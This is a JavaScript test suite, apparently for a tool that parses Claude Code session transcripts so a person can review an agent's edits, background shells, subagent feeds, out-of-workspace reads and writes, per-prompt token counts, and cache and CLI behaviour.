  assert.deepEqual(list.map((p) => p.id), ['shellB', 'shellA'], 'a running shell sorts above a finished one');
  const a = list.find((p) => p.id === 'shellA');
  const b = list.find((p) => p.id === 'shellB');
  assert.deepEqual([a.id, a.command, a.description], ['shellA', 'npm test', 'Run the suite'], 'identity comes from the spawn + its result');
  assert.equal(a.running, false, 'the completion notification ends it');
  assert.equal(a.exitCode, 0, 'the exit code is read out of the completion summary');
  assert.equal(a.runtimeMs, 60000, 'a finished shell measures start → finish');
  assert.equal(a.outputBytes, 12, 'the output file is stat-ed for volume');
  assert.equal(b.running, true, 'a shell with no completion notification is still running');
  assert.equal(b.runtimeMs, 90000, 'a live shell measures start → now');
  assert.equal(b.exitCode, null, 'a running shell has no exit code — reported as unknown, never 0');
  assert.deepEqual(core.summarizeProcesses(list), { total: 2, running: 1, failed: 0 }, 'headline for the Processes tab');
  assert.deepEqual(core.sessionProcesses(cwd, 'nope'), [], 'no transcript -> no processes');
});

test('feed: each kind tails the file that thing writes, and says what it dropped (0.8.7)', () => {
  freshHome();
  delete process.env.CLAUDE_CONFIG_DIR;
  const S = 'feedSess';
  const cwd = tmpWork();
  const proj = core.projectDir(cwd);
  fs.mkdirSync(proj, { recursive: true });
  const use = (id, name, input, ts) =>
    JSON.stringify({ timestamp: new Date(ts).toISOString(), type: 'assistant', message: { role: 'assistant', content: [{ type: 'tool_use', id, name, input }] } });
  const err = (id, ts) =>
    JSON.stringify({ timestamp: new Date(ts).toISOString(), type: 'user', message: { role: 'user', content: [{ type: 'tool_result', tool_use_id: id, is_error: true }] } });
  fs.writeFileSync(
    path.join(proj, S + '.jsonl'),
    [use('a1', 'Read', { file_path: '/x/one.ts' }, 1000), use('a2', 'Bash', { command: 'npm test' }, 2000), err('a2', 2100)].join('\n') + '\n'
  );

  const sess = core.liveFeed(cwd, S, { kind: 'session', id: '' });
  assert.equal(sess.entries.length, 2, 'the session feed is its main-chain tool calls');
  assert.equal(sess.entries[0].label, 'Read', 'oldest first — a feed reads downward like a terminal');
  assert.equal(sess.entries[1].ok, false, 'a failed call is marked, not silently normal');

  // A limit must report what it hid: a feed that silently truncates reads as "this is everything".
  const capped = core.liveFeed(cwd, S, { kind: 'session', id: '' }, { limit: 1 });
  assert.equal(capped.entries.length, 1, 'limit honoured');
  assert.equal(capped.truncated, 1, 'and the dropped count is reported');
  assert.equal(capped.entries[0].label, 'Bash', 'the NEWEST entries survive a cap, not the oldest');

  // A subagent's feed comes from its own transcript.
  const subDir = path.join(proj, S, 'subagents');
  fs.mkdirSync(subDir, { recursive: true });
  const agFile = path.join(subDir, 'agent-ag1.jsonl');
  // A COMPLETED turn (the call and its result), then backdated: an unanswered tool call would read as
  // awaiting-permission — still alive — and phase is staleness-derived, so a file written a millisecond
  // ago never looks finished either. (utimesSync takes SECONDS.)
  fs.writeFileSync(
    agFile,
    [use('s1', 'Grep', { pattern: 'todo' }, 3000), JSON.stringify({ timestamp: new Date(3100).toISOString(), type: 'user', message: { role: 'user', content: [{ type: 'tool_result', tool_use_id: 's1' }] } })].join('\n') + '\n'
  );
  const anHourAgo = (Date.now() - 60 * 60_000) / 1000;
  fs.utimesSync(agFile, anHourAgo, anHourAgo);
  const ag = core.liveFeed(cwd, S, { kind: 'agent', id: 'ag1' });
  assert.equal(ag.entries[0].label, 'Grep', "an agent's feed is its OWN transcript, not the parent's");

  // A background shell has no structured events — its feed is the output file, tailed.
  const outFile = path.join(cwd, 'p.output');
  fs.writeFileSync(outFile, 'line one\nline two\n');
  fs.writeFileSync(
    path.join(proj, 'procFeed.jsonl'),
    [
      JSON.stringify({ timestamp: new Date(1000).toISOString(), type: 'assistant', message: { role: 'assistant', content: [{ type: 'tool_use', id: 'p1', name: 'Bash', input: { command: 'tail -f log', run_in_background: true } }] } }),
      JSON.stringify({ timestamp: new Date(1100).toISOString(), type: 'user', toolUseResult: { backgroundTaskId: 'sh1' }, message: { role: 'user', content: [{ type: 'tool_result', tool_use_id: 'p1', content: `Command running in background with ID: sh1. Output is being written to: ${outFile}.` }] } }),
    ].join('\n') + '\n'
  );
  const proc = core.liveFeed(cwd, 'procFeed', { kind: 'process', id: 'sh1' });
  assert.deepEqual(proc.entries.map((e) => e.label), ['line one', 'line two'], 'output lines become feed rows');
  assert.equal(proc.entries[0].ts, 0, 'raw output carries no timestamp — reported as 0, never invented');
  assert.equal(proc.running, true, 'no completion notification yet -> still running');
  // A feed means a different thing depending on whether its source is still going: follow a live one,
  // read a finished one as the record it is. Renderers key their label and their polling off this.
  assert.equal(proc.mode, 'live', 'a running shell yields a LIVE feed');
  assert.equal(ag.mode, 'audit', 'a finished agent yields an AUDIT log, and should stop being polled');

  const missing = core.liveFeed(cwd, S, { kind: 'agent', id: 'nope' });
  assert.deepEqual([missing.entries.length, missing.running], [0, false], 'an unknown target is empty, not an error');
  assert.ok(missing.note, 'and says why it is empty');
});

test('processes: a shell that never reported an end is bounded by evidence, not by the clock (0.8.7)', () => {
  freshHome();
  delete process.env.CLAUDE_CONFIG_DIR;
  const S = 'procEvidence';
  const cwd = tmpWork();
  const proj = core.projectDir(cwd);
  fs.mkdirSync(proj, { recursive: true });
  const at = (ms) => new Date(ms).toISOString();
  const spawn = (id, cmd, ts, bg = true) =>
    JSON.stringify({ timestamp: at(ts), type: 'assistant', message: { role: 'assistant', content: [{ type: 'tool_use', id, name: 'Bash', input: { command: cmd, run_in_background: bg } }] } });
  const result = (id, bg, ts) =>
    JSON.stringify({ timestamp: at(ts), type: 'user', toolUseResult: { backgroundTaskId: bg }, message: { role: 'user', content: [{ type: 'tool_result', tool_use_id: id, content: `Command running in background with ID: ${bg}.` }] } });
  const note = (bg, ts, status, code) =>
    JSON.stringify({ type: 'queue-operation', operation: 'enqueue', timestamp: at(ts), content: `<task-notification> <task-id>${bg}</task-id> <tool-use-id>t9</tool-use-id> <status>${status}</status> <summary>done (exit code ${code})</summary> </task-notification>` });

  fs.writeFileSync(
    path.join(proj, S + '.jsonl'),
    [
      // never-ending shell: the session's last record is the last moment we can vouch for
      spawn('t1', 'tail -f log', 1000),
      result('t1', 'ghost', 1100),
      // the harness logs each completion TWICE (enqueue, then remove) — the FIRST is when it ended
      spawn('t2', 'npm test', 2000),
      result('t2', 'twice', 2100),
      note('twice', 62000, 'completed', 0),
      JSON.stringify({ type: 'queue-operation', operation: 'remove', timestamp: at(120000), content: '<task-notification> <task-id>twice</task-id> <status>completed</status> <summary>done (exit code 0)</summary> </task-notification>' }),
      // an end that arrives BEFORE the result binding its id must still be applied
      note('early', 3000, 'completed', 0),
      spawn('t3', 'sleep 1', 4000),
      result('t3', 'early', 4100),
      // an explicit kill is the only end some shells ever get
      spawn('t4', 'watch', 5000),
      result('t4', 'killme', 5100),
      JSON.stringify({ timestamp: at(9000), type: 'assistant', message: { role: 'assistant', content: [{ type: 'tool_use', id: 't5', name: 'TaskStop', input: { task_id: 'killme' } }] } }),
    ].join('\n') + '\n'
  );

  const byId = Object.fromEntries(core.sessionProcesses(cwd, S, 999999999).map((p) => [p.id, p]));
  assert.equal(byId.twice.runtimeMs, 60000, 'the FIRST completion is when it ended — the later `remove` inflated runtimes up to 10x');
  assert.equal(byId.early.running, false, 'a completion logged before its binding result is still applied');
  assert.equal(byId.killme.status, 'stopped', 'TaskStop is an end — otherwise a killed shell runs forever');
  assert.equal(byId.killme.running, false, 'and it is no longer polled');
  // The open shell: "nobody told us it stopped" is not "it is still running at this instant".
  assert.equal(byId.ghost.running, true, 'with no end recorded we do not claim it finished');
  // Last evidence in this fixture is the `remove` record at 120000, so the open shell measures to
  // there — not to `now`, which would have reported the age of the session instead of a runtime.
  assert.equal(byId.ghost.runtimeMs, 119000, 'an open shell is measured to the last evidence, never to the clock');
  assert.ok(byId.ghost.runtimeMs < 999999999 - byId.ghost.startedTs, 'and is nowhere near now-minus-start');
});

test('observe: a subagent edit takes ITS OWN reasoning, and one gap does not cascade (0.8.7)', () => {
  freshHome();
  delete process.env.CLAUDE_CONFIG_DIR;
  const S = 'reasonAuthor';
  const cwd = tmpWork();
  const F = path.join(cwd, 'app.js');
  const G = path.join(cwd, 'lib.js');
  // #1 main-chain edit, #2 subagent edit (same file), #3 main-chain edit after an unexplained gap.
  seedEdit(S, F, 'a\n', 'b\n'); // id 1, ts 1000
  seedEdit(S, F, 'b\n', 'c\n'); // id 2, ts 2000  ← authored by the subagent
  seedEdit(S, G, 'x\n', 'y\n'); // id 3, ts 3000
  const proj = core.projectDir(cwd);
  fs.mkdirSync(proj, { recursive: true });
  const turn = (ts, text, file) =>
    JSON.stringify({ timestamp: new Date(ts).toISOString(), type: 'assistant', message: { role: 'assistant', content: [{ type: 'text', text }, { type: 'tool_use', id: 'u' + ts, name: 'Edit', input: { file_path: file } }] } });
  // The MAIN transcript explains #1 and #3 only — it never saw the subagent's edit.
  fs.writeFileSync(path.join(proj, S + '.jsonl'), [turn(900, 'Main: rename the handler.', F), turn(2900, 'Main: extend the helper.', G)].join('\n') + '\n');
  // The subagent's own transcript explains #2.
  const subDir = path.join(proj, S, 'subagents');
  fs.mkdirSync(subDir, { recursive: true });
  fs.writeFileSync(path.join(subDir, 'agent-a1.jsonl'), turn(1900, 'Agent: tighten the guard clause.', F) + '\n');

  const m = core.reasoningByEdit(cwd, S);
  assert.equal(m.get(1), 'Main: rename the handler.', 'the main chain explains its own edit');
  // The bug this pins: the subagent's edit used to take the orchestrator's words (or nothing at all),
  // because only the main transcript was searched and matching walked a positional cursor.
  assert.equal(m.get(2), 'Agent: tighten the guard clause.', "a subagent's edit takes the words of the agent that made it");
  assert.equal(m.get(3), 'Main: extend the helper.', 'and a later edit is unaffected — one gap no longer shifts everything after it');
});

test('audits: boundary crossings land in the audit that owns them (0.8.7)', () => {
  const root = '/work/app';
  const acts = [
    { ts: 1, tool: 'Read', category: 'read', target: '/work/app/src/a.ts', ok: true, isError: false },
    { ts: 2, tool: 'Read', category: 'read', target: '/etc/hosts', ok: true, isError: false },
    { ts: 3, tool: 'Read', category: 'read', target: '/etc/hosts', ok: true, isError: false },
    { ts: 4, tool: 'Write', category: 'edit', target: '/work/app/src/b.ts', ok: true, isError: false },
    { ts: 5, tool: 'Edit', category: 'edit', target: '/tmp/scratch.md', ok: true, isError: false },
  ];
  // Reading outside the boundary is REACH — the same question egress answers for the network — so it
  // arrives as a channel of that report rather than as a second audit.
  const reads = core.outsideReads(acts, root);
  assert.equal(reads.length, 1, 'only the read that left the workspace is a channel');
  assert.deepEqual([reads[0].kind, reads[0].scope, reads[0].count], ['file', 'local', 2], 'repeat reads of one path collapse to a count');
  assert.notEqual(reads[0].scope, 'unknown', "'local' is a fact; 'unknown' is an admission — never collapse the two");

  // Writing outside it is DAMAGE, which is risk's question. Reported as an observation, never scored.
  const writes = core.outsideWrites(acts, root);
  assert.equal(writes.length, 1, 'only the edit that left the workspace is reported');
  assert.ok(writes[0].file.endsWith('scratch.md'), 'named by path so a renderer can open it');

  assert.deepEqual(core.outsideReads([], root), [], 'nothing read outside -> nothing claimed');
  assert.deepEqual(core.outsideWrites([], root), [], 'nothing written outside -> nothing claimed');
  assert.ok(/exercised, not approved/.test(core.EXERCISED_NOTE), 'the product rule survives the fold, in one place');
});

test('prompts: the session splits by what the USER asked, and work belongs to the ask that started it', () => {
  freshHome();
  delete process.env.CLAUDE_CONFIG_DIR;
  const S = 'reqSplit';
  const cwd = tmpWork();
  const proj = core.projectDir(cwd);
  fs.mkdirSync(proj, { recursive: true });
  // Three DIFFERENT files: same-code collapse folds repeated edits to one file into a single review
  // unit, and this test is about which ASK owns which work — not about the collapse.
  seedEdit(S, path.join(cwd, 'a.js'), 'a\n', 'b\n'); // id 1 → ts 1000
  seedEdit(S, path.join(cwd, 'b.js'), 'x\n', 'y\n'); // id 2 → ts 2000
  seedEdit(S, path.join(cwd, 'c.js'), 'p\n', 'q\n'); // id 3 → ts 3000
  const ask = (ts, text) =>
    JSON.stringify({ timestamp: new Date(ts).toISOString(), type: 'user', message: { role: 'user', content: text } });
  fs.writeFileSync(
    path.join(proj, S + '.jsonl'),
    [
      ask(500, 'first, add the thing'),
      // Records that WEAR the user's role without being anything a person typed. Counting any of them
      // would invent turns, and every one of these occurs in real transcripts.
      JSON.stringify({ timestamp: new Date(600).toISOString(), type: 'user', message: { role: 'user', content: '<local-command-stdout>Set effort level to max</local-command-stdout>' } }),
      JSON.stringify({ timestamp: new Date(700).toISOString(), type: 'user', isCompactSummary: true, message: { role: 'user', content: 'This session is being continued…' } }),
      JSON.stringify({ timestamp: new Date(800).toISOString(), type: 'user', message: { role: 'user', content: [{ type: 'tool_result', tool_use_id: 'x' }] } }),
      JSON.stringify({ timestamp: new Date(900).toISOString(), type: 'user', isSidechain: true, message: { role: 'user', content: 'a subagent turn' } }),
      // Token usage inside request #1's window — the two lines share a message.id (one assistant
      // message split across lines), so the usage counts ONCE: 100+50+1000+200 = 1350.
      JSON.stringify({ timestamp: new Date(1500).toISOString(), type: 'assistant', message: { role: 'assistant', id: 'msgA', usage: { input_tokens: 100, output_tokens: 50, cache_read_input_tokens: 1000, cache_creation_input_tokens: 200 } } }),
      JSON.stringify({ timestamp: new Date(1550).toISOString(), type: 'assistant', message: { role: 'assistant', id: 'msgA', usage: { input_tokens: 100, output_tokens: 50, cache_read_input_tokens: 1000, cache_creation_input_tokens: 200 } } }),
      // A to-do marked in_progress during request #1 → one "task worked".
      JSON.stringify({ timestamp: new Date(1600).toISOString(), type: 'assistant', message: { role: 'assistant', id: 'msgT', content: [{ type: 'tool_use', id: 'tuTodo', name: 'TodoWrite', input: { todos: [{ content: 'build the thing', status: 'in_progress' }] } }] } }),
      // The SAME item planned the other way (0.8.8): a TaskCreate naming it, then TaskUpdate flipping
      // its status twice. Identity is the content digest, and TaskUpdate names nothing — so this whole
      // group still counts ONE task, not four. (The old counter keyed on the raw target string and
      // reported "1", "2" and the subject as three separate tasks.)
      JSON.stringify({ timestamp: new Date(1620).toISOString(), type: 'assistant', message: { role: 'assistant', id: 'msgT2', content: [{ type: 'tool_use', id: 'tuTc', name: 'TaskCreate', input: { subject: 'build the thing', description: 'the same item, planned twice' } }] } }),
      JSON.stringify({ timestamp: new Date(1640).toISOString(), type: 'assistant', message: { role: 'assistant', id: 'msgT3', content: [{ type: 'tool_use', id: 'tuTu1', name: 'TaskUpdate', input: { taskId: '1', status: 'in_progress' } }] } }),
      JSON.stringify({ timestamp: new Date(1660).toISOString(), type: 'assistant', message: { role: 'assistant', id: 'msgT4', content: [{ type: 'tool_use', id: 'tuTu2', name: 'TaskUpdate', input: { taskId: 1, status: 'completed' } }] } }),
      ask(2500, 'now the second thing'),
      JSON.stringify({ timestamp: new Date(2600).toISOString(), type: 'assistant', message: { role: 'assistant', id: 'msgB', usage: { input_tokens: 300, output_tokens: 200 } } }),
    ].join('\n') + '\n'
  );

  const rs = core.sessionPrompts(cwd, S);
  assert.equal(rs.length, 2, 'command stubs, compaction summaries, tool results and sidechains are not asks');
  assert.deepEqual(rs.map((r) => r.index), [1, 2], 'numbered the way a person counts their own turns');
  // Edits 1 and 2 landed before the second ask; edit 3 after it.
  assert.deepEqual(rs[0].editIds, [1, 2], 'the first ask owns the work done before the next one');
  assert.deepEqual(rs[1].editIds, [3], 'and the second owns what followed');
  assert.equal(rs[0].added > 0, true, '±lines are accumulated, not left at zero');
  assert.equal(rs[1].endTs, 0, 'the ask being answered has no end yet');
  assert.deepEqual(core.promptEditIds(cwd, S, rs[0].id), [1, 2], 'the review scope for "accept everything from this ask"');
  assert.deepEqual(core.summarizePrompts(rs), { total: 2, withEdits: 2, edits: 3 }, 'headline for the Prompts window');
  // 0.8.7: each ask carries files, folders, tokens and tasks — the per-request headline stats.
  assert.equal(rs[0].files, 2, 'prompt #1 touched a.js and b.js');
  assert.equal(rs[0].folders, 1, '…both in the one folder');
  assert.equal(rs[1].files, 1, 'prompt #2 touched only c.js');
  // input(100) + output(50) + cacheCreation(200) = 350, deduped by message id (counted once, not
  // twice). cacheRead(1000) is EXCLUDED: it is the prompt read back each turn, so counting it made
  // the same context accumulate per turn — it was 98.8% of the old blended 1350-style figure and
  // reported millions where Claude Code reported ~128k for the same agent. Matching Claude Code is
  // the point: two tools disagreeing about one run is worse than either being slightly off.
  assert.equal(rs[0].tokens, 350, 'tokens processed once: input + output + cacheCreation, deduped by message id');
  assert.equal(rs[1].tokens, 500, 'the second ask gets only the usage in its own window');
  assert.equal(
    rs[0].tasks,
    1,
    'one item planned as BOTH a to-do and a task, then moved twice, counts once — identity is the ' +
      'content digest shared by TodoWrite, TaskCreate and TaskUpdate'
  );
  assert.equal(rs[1].tasks, 0, 'an ask that touched no to-do reports zero, not a guess');
  assert.deepEqual(core.sessionPrompts(cwd, 'nope'), [], 'no transcript -> no prompts');

  // …and the SLICES the Requests window scopes everything by (0.8.7). Same partition, aggregated the
  // way a workflow's slice is, so a renderer can swap one for the other.
  const plain = core.buildChangeMap(cwd, S, { root: cwd });
  assert.deepEqual(plain.prompts, [], 'slices are opt-in — the fleet builds a map per sibling and none of them needs one');
  const map = core.buildChangeMap(cwd, S, { root: cwd, prompts: true });
  assert.equal(map.prompts.length, 2, 'one slice per ask');
  assert.equal(map.prompts[0].rollup.edits, 2, 'the first ask’s own edit count');
  assert.equal(map.prompts[1].rollup.edits, 1, '…and the second’s');
  assert.equal(
    map.prompts[0].rollup.added + map.prompts[1].rollup.added,
    map.summary.added,
    'the slices partition the session exactly — every line is claimed once'
  );
  assert.deepEqual(map.prompts[0].files.map((f) => f.file).sort(), ['a.js', 'b.js'], 'a slice carries its own file rollup (no renderer re-aggregates)');
  assert.deepEqual(map.prompts[1].files.map((f) => f.file), ['c.js'], '…and only its own files — never a neighbouring ask’s');
  assert.equal(map.prompts[0].modules.length, 1, '…plus its own folder buckets, for the strip');
  assert.equal(map.prompts[0].text, 'first, add the thing', 'the slice carries the ask in FULL — renderers wrap it, nothing is clipped');
  assert.deepEqual(map.prompts[0].editIds, [1, 2], 'the review scope rides along');

  // Accept/reject by REQUEST scope resolves to exactly that ask's edits and flips only those — the set
  // keepRequest/undoRequest apply in the editors. #1 owns edits 1 & 2; accepting it must leave #2's
  // edit 3 pending. (Task/folder/file scopes are covered end-to-end in test/e2e.sh.)
  for (const id of core.promptEditIds(cwd, S, rs[0].id)) core.setStatus(S, id, 'kept');
  const afterKeep = core.readLog(S);
  assert.deepEqual(afterKeep.filter((r) => r.status === 'kept').map((r) => r.id).sort((a, b) => a - b), [1, 2],
    'accepting a request flips exactly its own edits');
  assert.equal(afterKeep.find((r) => r.id === 3).status, 'pending', '…and leaves a neighbouring ask’s edit untouched');
});

// ---------------------------------------------------------------------------------------------
// 0.9.0 coverage for the verbs and caches this release added. Each of these was written because a
// mutation to the code it covers passed the whole suite: a green build was proving nothing about
// resolve, warm, --stale, the delta cache's READ path, or the placement store's prune rule.
// ---------------------------------------------------------------------------------------------

test('store: resolve accepts every pending edit and clears the log — in that order (0.9.0)', () => {
  freshHome();
  const S = 'resolveOrder';
  seedEdit(S, '/w/a.ts', 'x\n', 'y\n');
  seedEdit(S, '/w/b.ts', 'p\n', 'q\n');
  const c = seedEdit(S, '/w/c.ts', 'm\n', 'n\n');
  core.setStatus(S, c, 'kept'); // already carries a verdict before resolve runs
  const r = core.resolveSession(S);
  assert.deepEqual(r, { accepted: 2, cleared: 3 }, 'both pending edits accepted, all three records dropped');
  // THE ORDERING CONTROL. clearResolved only drops records that already carry a verdict, so running it
  // first would drop `c` alone (cleared: 1) and leave the two it never saw sitting in the log as kept.
  // `accepted` reads the same either way — the empty log is what pins the order.
  assert.deepEqual(core.readLog(S), [], 'nothing survives a resolve');
});

test('core: every built module loads standalone, so the require cycle stays benign (0.9.0)', () => {
  // observe.ts documents this test by name. It did not exist: every test requires the barrel, which
  // hides load-order faults because tsc hoists `exports.fn = fn` above the requires — true for function
  // declarations and silently false the first time a module exports a const computed at load.
  const dist = path.resolve(__dirname, '../dist');
  const mods = fs.readdirSync(dist).filter((f) => f.endsWith('.js') && f !== 'index.js');
  assert.ok(mods.length > 5, `positive control: found ${mods.length} modules to load`);
  const broken = [];
  for (const m of mods) {
    const r = cp.spawnSync(process.execPath, ['-e', `require(${JSON.stringify(path.join(dist, m))})`], { encoding: 'utf8' });
    if (r.status !== 0) broken.push(`${m}: ${(r.stderr || '').split('\n').find((l) => l.trim()) || 'exit ' + r.status}`);
  }
  assert.deepEqual(broken, [], 'each module must be requirable on its own, not only through the barrel');
});

test('cli: warm skips the reviewed session and anything past --since (0.9.0)', () => {
  const home = freshHome();
  delete process.env.CLAUDE_CONFIG_DIR;
  const cwd = fs.realpathSync(tmpWork()); // execFileSync hands the child the realpath; projectDir must agree
  const proj = core.projectDir(cwd);
  fs.mkdirSync(proj, { recursive: true });
  const now = Date.now();
  const mk = (id, ageMs) => {
    const p = path.join(proj, id + '.jsonl');
    fs.writeFileSync(p, [
      JSON.stringify({ timestamp: new Date(now - ageMs).toISOString(), type: 'user', message: { role: 'user', content: 'do a thing' } }),
      JSON.stringify({ timestamp: new Date(now - ageMs + 10).toISOString(), type: 'assistant', message: { role: 'assistant', id: 'a1', content: [{ type: 'text', text: 'ok' }] } }),
    ].join('\n') + '\n');
    const s = (now - ageMs) / 1000;
    fs.utimesSync(p, s, s);
    core.ensureStore(id); // a store is what makes it a listed session
    return p;
  };
  mk('warmOld', 5 * 24 * 3600_000); // outside a 24h window
  mk('warmRecent', 2 * 3600_000);
  mk('warmCurrent', 1000); // newest transcript with an assistant record === the session under review
  const env = { ...process.env, HOME: home, USERPROFILE: home };
  const out = JSON.parse(cp.execFileSync('node', [CLI, 'warm', '--json', '--root', cwd, '--since', '24h'], { cwd, env, encoding: 'utf8' }));
  assert.deepEqual(out.warmed, ['warmRecent'], 'only the recent SIBLING is warmed');
  // Positive control for the window itself: widen it and the old session joins. Without this a `warm`
  // that simply warmed nothing would satisfy the assertion above.
  const wide = JSON.parse(cp.execFileSync('node', [CLI, 'warm', '--json', '--root', cwd, '--since', '7d'], { cwd, env, encoding: 'utf8' }));
  assert.deepEqual(wide.warmed.sort(), ['warmOld', 'warmRecent'], '--since widens the window but never pulls in the reviewed session');
  const bad = cp.spawnSync('node', [CLI, 'warm', '--root', cwd, '--since', 'soon'], { cwd, env, encoding: 'utf8' });
  assert.notEqual(bad.status, 0, 'a bad --since fails loudly rather than silently defaulting');
});

test('cli: clean --completed --stale widens the abandoned window only (0.9.0)', () => {
  const home = freshHome();
  delete process.env.CLAUDE_CONFIG_DIR;
  const cwd = fs.realpathSync(tmpWork());
  const proj = core.projectDir(cwd);
  fs.mkdirSync(proj, { recursive: true });
  const now = Date.now();
  const mk = (id, ageMs) => {
    const p = path.join(proj, id + '.jsonl');
    fs.writeFileSync(p, [
      JSON.stringify({ timestamp: new Date(now - ageMs).toISOString(), type: 'user', message: { role: 'user', content: 'q' } }),
      JSON.stringify({ timestamp: new Date(now - ageMs + 10).toISOString(), type: 'assistant', message: { role: 'assistant', id: 'a1', content: [{ type: 'text', text: 'a' }] } }),
    ].join('\n') + '\n');
    const s = (now - ageMs) / 1000;
    fs.utimesSync(p, s, s);
    return p;
  };
  mk('staleLive', 1000); // newest + an assistant record: this is the session under review, never reaped
  core.ensureStore('staleLive');
  mk('staleAband', 30 * 24 * 3600_000); // a month dead, but still holding unreviewed work
  seedEdit('staleAband', path.join(cwd, 'x.ts'), 'a\n', 'b\n');
  const env = { ...process.env, HOME: home, USERPROFILE: home };
  const run = (extra) => JSON.parse(cp.execFileSync('node', [CLI, 'clean', '--completed', '--json', ...extra], { cwd, env, encoding: 'utf8' }));
  const spared = run(['--stale', '60d']);
  assert.ok(!spared.sessions.some((s) => s.id === 'staleAband'), '--stale 60d spares a session dead only 30 days');
  // Positive control: the DEFAULT 14-day window reaps exactly that session, so the assertion above is
  // measuring the flag and not an unreapable fixture.
  const reaped = run([]);
  const row = reaped.sessions.find((s) => s.id === 'staleAband');
  assert.ok(row, 'the default window reaps it');
  assert.equal(row.pending, 1, 'and the CLI reports the unreviewed work it discarded');
  assert.ok(!reaped.sessions.some((s) => s.id === 'staleLive'), 'the session under review is never reaped, at any window');
  for (const bad of [['--stale'], ['--stale', 'never']]) {
    assert.notEqual(cp.spawnSync('node', [CLI, 'clean', '--completed', ...bad], { cwd, env, encoding: 'utf8' }).status, 0, `\`clean --completed ${bad.join(' ')}\` fails loudly`);
  }
});

test('observe: the delta cache is READ, not just written — counts survive losing the blobs (0.9.0)', () => {
  const home = freshHome();
  const S = 'deltaRead';
  seedEdit(S, '/w/a.ts', 'a\nb\n', 'a\nb\nc\nd\ne\n'); // +3
  seedEdit(S, '/w/b.ts', 'p\nq\nr\n', 'p\n'); // -2
  const warm = core.sessionCounts(S);
  assert.deepEqual({ added: warm.added, removed: warm.removed }, { added: 3, removed: 2 }, 'the cold count is right');
  // Delete the evidence the count is derived FROM, and the sidecar that would answer from memory. A
  // cache that is written but never read now recomputes from nothing and reports zeroes.
  fs.rmSync(path.join(core.rootDir(), S, 'blobs'), { recursive: true, force: true });
  fs.rmSync(path.join(core.rootDir(), 'session-meta', `${S}.json`), { force: true });
  const child = cp.execFileSync('node', ['-e',
    `const c=require(${JSON.stringify(path.resolve(__dirname, '../dist/index.js'))});const r=c.sessionCounts(${JSON.stringify(S)});console.log(JSON.stringify({added:r.added,removed:r.removed}))`,
  ], { env: { ...process.env, HOME: home, USERPROFILE: home }, encoding: 'utf8' });
  assert.deepEqual(JSON.parse(child), { added: 3, removed: 2 }, 'a cold process answers from the persisted per-blob-pair cache');
});

test('observe: the delta cache drops entries for records that are gone (0.9.0)', () => {
  freshHome();
  const S = 'deltaPrune';
  const a = seedEdit(S, '/w/a.ts', 'a\n', 'a\nb\n');
  seedEdit(S, '/w/b.ts', 'p\n', 'p\nq\n');
  core.sessionCounts(S);
  const pairs = () => Object.keys(JSON.parse(fs.readFileSync(path.join(core.rootDir(), 'changemap-cache', S, 'deltas.json'), 'utf8')).pairs).length;
  assert.equal(pairs(), 2, 'both blob pairs cached');
  core.setStatus(S, a, 'kept');
  core.clearResolved(S);
  fs.rmSync(path.join(core.rootDir(), 'session-meta', `${S}.json`), { force: true }); // force a real recount
  core.sessionCounts(S);
  assert.equal(pairs(), 1, 'the dropped record takes its cache entry with it instead of leaking forever');
});

test('tree: a filtered build must not prune the placements of files it never looked at (0.9.0)', () => {
  freshHome();
  const cwd = fs.realpathSync(tmpWork());
  const S = 'placePrune';
  // Placement only runs for files with structure to place edits INTO — a class-free file is grouped as
  // `loose` and never touches the store, so a fixture without one exercises nothing.
  const before = (n) => `export class ${n} {\n  run() {\n    return 1;\n  }\n}\n`;
  const after = (n) => `export class ${n} {\n  run() {\n    return 1;\n  }\n  extra() {\n    return 2;\n  }\n}\n`;
  for (const f of ['alpha.ts', 'beta.ts']) {
    const n = f[0].toUpperCase() + f.slice(1, -3);
    fs.writeFileSync(path.join(cwd, f), after(n));
    seedEdit(S, path.join(cwd, f), before(n), after(n));
  }
  const pfile = path.join(core.rootDir(), 'changemap-cache', S, 'placements.json');
  core.buildEditTree(S, { root: cwd });
  const full = Object.keys(JSON.parse(fs.readFileSync(pfile, 'utf8')).entries).length;
  assert.equal(full, 2, 'an unfiltered build places both files');
  core.buildEditTree(S, { root: cwd, filter: 'alpha' });
  assert.equal(Object.keys(JSON.parse(fs.readFileSync(pfile, 'utf8')).entries).length, 2,
    'a filtered build sees one file and must not treat the other as unreferenced');
});

test('observe: a plan with no rolling windows says so, instead of drawing empty quota bars (0.9.0)', () => {
  const home = freshHome();
  delete process.env.CLAUDE_CONFIG_DIR;
  fs.mkdirSync(path.join(home, '.claude'), { recursive: true });
  const cwd = fs.realpathSync(tmpWork());
  const cache = path.join(home, '.claude', 'statusline-last.json');
  const write = (o) => { fs.writeFileSync(cache, JSON.stringify(o)); core.clearFsCache(); };

  // Claude Code sends rate_limits.* ONLY for Claude.ai subscription plans. An Enterprise or API account
  // gets a turn like this one — context, no limits — and the 5h/weekly bars then sat at empty forever,
  // which reads as "none of your quota used" rather than "this plan has no quota to use".
  write({ ctx_pct: 19, ctx_size: 1000000, ctx_used: 186131 });
  const ent = core.usageLine(cwd, 'none');
  assert.equal(ent.rollingLimits, false, 'a reading that carried no rate_limits means the plan has none');
  assert.deepEqual([ent.fiveHourPct, ent.weekPct], [null, null], 'and there is nothing to draw in the bars');
  assert.ok(Array.isArray(ent.localWindows) && ent.localWindows.length >= 1,
    'so it is replaced by something measurable — locally counted token windows');
  assert.ok(ent.localWindows.every((w) => typeof w.label === 'string' && typeof w.tokens === 'number'),
    'each window carries the label it was measured over, so a row cannot be drawn under the wrong one');

  // The status line measures the same transcripts against the clocks it draws. When it has written its
  // totals, they win — two surfaces reporting different numbers for one account is the bug this release
  // is mostly about.
  write({ ctx_pct: 19, five_meas: 3500, week_meas: 5250 });
  assert.deepEqual(core.usageLine(cwd, 'none').localWindows,
    [{ label: '5h', tokens: 3500 }, { label: 'wk', tokens: 5250 }],
    'the status line\u2019s own measured windows are preferred over a second local scan — and the week label reads "wk", as the status line itself prints it');

  // A subscription account must be untouched by all of this.
  write({ ctx_pct: 19, five_pct: 42, week_pct: 8 });
  const sub = core.usageLine(cwd, 'none');
  assert.equal(sub.rollingLimits, true, 'percentages present ⇒ this plan does have rolling windows');
  assert.equal(sub.fiveHourPct, 42, 'and they are still read exactly as before');
  assert.equal(sub.localWindows, null, 'the replacement is not computed for an account that will never see it');

  // And "nothing has reported yet" is a THIRD state, not the enterprise one — treating a missing cache
  // as "no limits" would tell every user who has not installed the status line that they have no plan.
  fs.rmSync(cache);
  core.clearFsCache();
  assert.equal(core.usageLine(cwd, 'none').rollingLimits, null, 'no reading at all is unknown, never false');
});

